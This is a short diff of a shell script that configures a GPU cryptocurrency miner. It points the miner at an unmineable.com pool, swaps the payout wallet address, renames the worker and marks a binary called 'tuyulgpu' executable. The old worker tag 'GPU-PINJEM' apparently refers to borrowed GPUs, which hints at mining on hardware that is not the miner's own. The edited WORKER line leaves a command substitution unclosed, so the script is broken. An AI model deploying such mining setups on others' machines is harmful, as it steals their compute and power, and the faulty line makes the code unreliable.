@@ -2,9 +2,9 @@
 
 POOL=ethash.unmineable.com:13333
 
-WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725
+WALLET=ETH:0x40819d362CCfb0bb130C80cc0dBB4cdef5b02417
 
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)#rame-kb3u
 
 chmod +x tuyulgpu
 
